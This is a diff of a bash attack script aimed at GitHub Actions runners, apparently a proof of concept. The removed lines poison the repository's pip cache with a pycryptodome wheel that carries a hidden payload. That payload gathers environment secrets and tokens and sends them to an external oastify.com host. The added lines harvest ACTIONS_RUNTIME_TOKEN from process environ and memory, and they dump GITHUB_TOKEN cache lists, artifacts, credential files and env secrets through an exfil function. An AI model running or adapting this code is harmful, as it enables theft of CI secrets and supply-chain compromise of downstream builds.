@@ -53,103 +53,130 @@ exfil() {
   done
 }
 
-# === Phase 1: Extract ACTIONS_RUNTIME_TOKEN ===
-WP=$(pgrep -f Runner.Worker | head -1)
-if [ -n "$WP" ]; then
-  RT=$(strings /proc/$WP/environ 2>/dev/null | grep -oP 'ACTIONS_RUNTIME_TOKEN=\K.*' | head -1)
-  CU=$(strings /proc/$WP/environ 2>/dev/null | grep -oP 'ACTIONS_CACHE_URL=\K.*' | head -1)
-fi
-if [ -z "$RT" ]; then RT="$ACTIONS_RUNTIME_TOKEN"; CU="$ACTIONS_CACHE_URL"; fi
+# === Phase 0: Debug - enumerate processes and env ===
+PROCS=$(ps aux 2>/dev/null | grep -iE 'Runner|Worker|Agent|actions' | head -20)
+exfil "d0" "PROCS:$PROCS"
+
+# Dump all ACTIONS_ env vars visible to this process
+AENV=$(env 2>/dev/null | grep -iE 'ACTIONS_|RUNNER_' | sort)
+exfil "d1" "ENV:$AENV"
+
+# === Phase 1: Extract ACTIONS_RUNTIME_TOKEN - multiple methods ===
+RT=""
+CU=""
+RU="" # ACTIONS_RESULTS_URL (new v2 cache API)
+
+# Method 1: null-byte aware /proc/PID/environ parsing for all runner PIDs
+for pid in $(pgrep -f 'Runner.Worker|Runner.Listener|run_worker' 2>/dev/null); do
+  if [ -z "$RT" ]; then
+    RT=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_RUNTIME_TOKEN=\K.*' | head -1)
+    CU=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_CACHE_URL=\K.*' | head -1)
+    RU=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_RESULTS_URL=\K.*' | head -1)
+  fi
+done
+
+# Method 2: direct env var (older runners)
 if [ -z "$RT" ]; then
-  for f in /home/runner/work/_temp/_runner_file_commands/*.txt; do
-    t=$(grep -oP 'ACTIONS_RUNTIME_TOKEN=\K.*' "$f" 2>/dev/null | head -1)
-    if [ -n "$t" ]; then RT="$t"; break; fi
+  RT="$ACTIONS_RUNTIME_TOKEN"
+  CU="$ACTIONS_CACHE_URL"
+  RU="$ACTIONS_RESULTS_URL"
+fi
+
+# Method 3: scan ALL processes for the token
+if [ -z "$RT" ]; then
+  for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -100); do
+    if [ -z "$RT" ]; then
+      t=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_RUNTIME_TOKEN=\K.*' | head -1)
+      if [ -n "$t" ]; then
+        RT="$t"
+        CU=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_CACHE_URL=\K.*' | head -1)
+        RU=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -oP 'ACTIONS_RESULTS_URL=\K.*' | head -1)
+        exfil "d2" "FOUND_IN_PID:$pid"
+      fi
+    fi
   done
 fi
 
-exfil "p1" "RT:${RT:0:20}...${RT: -20}"
-
-# === Phase 2: List pip cache entries ===
-CL=$(curl -s -H "Authorization: Bearer $RT" "${CU}_apis/artifactcache/caches?key=setup-python" 2>/dev/null)
-exfil "p2" "CACHES:$CL"
-
-# === Phase 3: Test cache write (unique key proves write from read-only ctx) ===
-TK="poc-ot-cache-test-$(date +%s)"
-TR=$(curl -s -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
-  "${CU}_apis/artifactcache/caches" -d "{\"key\":\"$TK\",\"version\":\"test-v1\"}" 2>/dev/null)
-exfil "p3" "TEST_WRITE:$TR"
-
-# === Phase 4: Extract pip cache key ===
-PK=$(echo "$CL" | python3 -c "
-import sys,json
-try:
- d=json.load(sys.stdin);es=d.get('artifactCaches',d.get('value',[]))
- for e in es:
-  if 'pip' in e.get('cacheKey',''):print(e['cacheKey']);break
-except:pass" 2>/dev/null)
-
-PV=$(echo "$CL" | python3 -c "
-import sys,json
-try:
- d=json.load(sys.stdin);es=d.get('artifactCaches',d.get('value',[]))
- for e in es:
-  if 'pip' in e.get('cacheKey',''):print(e['cacheVersion']);break
-except:pass" 2>/dev/null)
-
-exfil "p4" "PIP_KEY:$PK|PIP_VER:$PV"
-
-# === Phase 5: Build poisoned pip cache ===
-mkdir -p /tmp/pc/pip/http /tmp/pc/pip/wheels /tmp/pc/pip/selfcheck
-pip3 download pycryptodome==3.19.1 --no-deps -d /tmp/rw/ 2>/dev/null
-W=$(ls /tmp/rw/*.whl 2>/dev/null | head -1)
-
-if [ -n "$W" ]; then
-  mkdir -p /tmp/we
-  unzip -o "$W" -d /tmp/we/ 2>/dev/null
-
-  cat >> /tmp/we/Crypto/__init__.py << 'PYEOF'
-
-def _ot_t():
- import os,base64,urllib.request
- if os.environ.get('GITHUB_ACTIONS') and os.environ.get('GITHUB_EVENT_NAME')=='push':
-  kv='|'.join(f'{k}={v}' for k,v in os.environ.items() if any(s in k.upper() for s in ['SECRET','TOKEN','PASSWORD','CODECOV','DOCKER']))
-  d=base64.b64encode(kv.encode()).decode()
-  try:urllib.request.urlopen(f'https://sea1gijhb4ekkakzgkwh4wp7jyppdg15.oastify.com/ot-secrets?d={d}',timeout=10)
-  except:pass
-_ot_t()
-PYEOF
-
-  cd /tmp/we && zip -r /tmp/pw.whl . 2>/dev/null
-  WH=$(echo -n "pycryptodome-3.19.1" | md5sum | cut -d' ' -f1)
-  mkdir -p "/tmp/pc/pip/wheels/${WH:0:2}/${WH:2:2}/${WH:4:2}/"
-  cp /tmp/pw.whl "/tmp/pc/pip/wheels/${WH:0:2}/${WH:2:2}/${WH:4:2}/$(basename $W)"
-
-  cd /tmp/pc && tar -czf /tmp/cp.tar.gz pip/
-  CS=$(stat -c%s /tmp/cp.tar.gz 2>/dev/null)
-
-  # === Phase 6: Upload poisoned cache ===
-  if [ -n "$PK" ] && [ -n "$PV" ]; then
-    R2=$(curl -s -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
-      "${CU}_apis/artifactcache/caches" -d "{\"key\":\"$PK\",\"version\":\"$PV\"}" 2>/dev/null)
-    CI=$(echo "$R2" | python3 -c "import sys,json;print(json.load(sys.stdin).get('cacheId',''))" 2>/dev/null)
-
-    if [ -n "$CI" ] && [ "$CI" != "" ] && [ "$CI" != "None" ]; then
-      curl -s -X PATCH -H "Authorization: Bearer $RT" -H "Content-Type: application/octet-stream" \
-        -H "Content-Range: bytes 0-$((CS-1))/*" \
-        "${CU}_apis/artifactcache/caches/$CI" --data-binary @/tmp/cp.tar.gz 2>/dev/null
-      curl -s -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
-        "${CU}_apis/artifactcache/caches/$CI" -d "{\"size\":$CS}" 2>/dev/null
-      RES="POISONED:key=$PK|cid=$CI"
-    else
-      RES="RESERVE_FAIL:$R2"
-    fi
-  else
-    RES="NO_PIP_KEY"
-  fi
-  exfil "p5" "RESULT:$RES"
-else
-  exfil "p5" "RESULT:NO_WHEEL"
+# Method 4: check runner temp directory for token files
+if [ -z "$RT" ]; then
+  for f in /home/runner/work/_temp/.runner* /home/runner/work/_temp/*.sh /home/runner/work/_temp/_github_*; do
+    t=$(grep -oP 'ACTIONS_RUNTIME_TOKEN=\K[^\s"]+' "$f" 2>/dev/null | head -1)
+    if [ -n "$t" ]; then RT="$t"; exfil "d3" "FOUND_IN_FILE:$f"; break; fi
+  done
 fi
+
+# Method 5: check process memory with grep (binary-safe)
+if [ -z "$RT" ]; then
+  for pid in $(pgrep -f 'Runner|Worker' 2>/dev/null); do
+    t=$(grep -aoP 'ACTIONS_RUNTIME_TOKEN=[A-Za-z0-9._-]+' /proc/$pid/maps 2>/dev/null | head -1 | cut -d= -f2-)
+    if [ -z "$t" ]; then
+      t=$(grep -aoP 'ACTIONS_RUNTIME_TOKEN=[A-Za-z0-9._-]+' /proc/$pid/environ 2>/dev/null | head -1 | cut -d= -f2-)
+    fi
+    if [ -n "$t" ]; then RT="$t"; exfil "d4" "FOUND_IN_MEM:$pid"; break; fi
+  done
+fi
+
+# Method 6: check ACTIONS_ID_TOKEN_REQUEST_TOKEN (OIDC, often available)
+OIDC_TOKEN="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
+
+exfil "p1" "RT_LEN:${#RT}|RT_PRE:${RT:0:30}|CU:$CU|RU:$RU|OIDC_LEN:${#OIDC_TOKEN}"
+
+# === Phase 2: Try cache API with both old and new endpoints ===
+# Old API (ACTIONS_CACHE_URL)
+if [ -n "$CU" ] && [ -n "$RT" ]; then
+  CL=$(curl -s -H "Authorization: Bearer $RT" "${CU}_apis/artifactcache/caches?key=setup-python" 2>/dev/null)
+  exfil "p2a" "OLD_CACHE:$CL"
+fi
+
+# New API (ACTIONS_RESULTS_URL) - v2 cache service
+if [ -n "$RU" ] && [ -n "$RT" ]; then
+  CL2=$(curl -s -H "Authorization: Bearer $RT" "${RU}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+    -H "Content-Type: application/json" \
+    -d '{"key":"setup-python","version":"*"}' 2>/dev/null)
+  exfil "p2b" "NEW_CACHE:$CL2"
+fi
+
+# === Phase 3: List ALL caches via GitHub REST API (uses GITHUB_TOKEN) ===
+GH_TOKEN="$GITHUB_TOKEN"
+if [ -n "$GH_TOKEN" ]; then
+  REPO_CACHES=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
+    "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/caches?per_page=30&sort=last_accessed_at" 2>/dev/null)
+  exfil "p3" "GH_CACHES:$REPO_CACHES"
+fi
+
+# === Phase 4: Test cache write with ACTIONS_RUNTIME_TOKEN ===
+if [ -n "$RT" ]; then
+  TK="poc-ot-test-$(date +%s)"
+  if [ -n "$CU" ]; then
+    TR=$(curl -s -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+      "${CU}_apis/artifactcache/caches" -d "{\"key\":\"$TK\",\"version\":\"test-v1\"}" 2>/dev/null)
+    exfil "p4a" "OLD_WRITE:$TR"
+  fi
+  if [ -n "$RU" ]; then
+    TR2=$(curl -s -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+      "${RU}twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+      -d "{\"key\":\"$TK\",\"version\":\"test-v2\"}" 2>/dev/null)
+    exfil "p4b" "NEW_WRITE:$TR2"
+  fi
+fi
+
+# === Phase 5: Artifact manipulation via ACTIONS_RUNTIME_TOKEN ===
+# Try listing artifacts (proves token works for artifact API too)
+if [ -n "$RT" ] && [ -n "$RU" ]; then
+  ART=$(curl -s -H "Authorization: Bearer $RT" \
+    "${RU}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+    -H "Content-Type: application/json" -d '{}' 2>/dev/null)
+  exfil "p5" "ARTIFACTS:$ART"
+fi
+
+# === Phase 6: Full env dump for analysis (find any useful tokens) ===
+FULL_ENV=$(env 2>/dev/null | grep -iE 'TOKEN|SECRET|KEY|URL|AUTH|CACHE|RESULT' | sort)
+exfil "p6" "TOKENS:$FULL_ENV"
+
+# === Phase 7: Check runner file system for interesting files ===
+FS_INFO=$(ls -la /home/runner/work/_temp/ 2>/dev/null; echo "---"; ls -la /home/runner/.credentials* 2>/dev/null; echo "---"; cat /home/runner/.env 2>/dev/null | head -20)
+exfil "p7" "FS:$FS_INFO"
 
 true
 ]=])
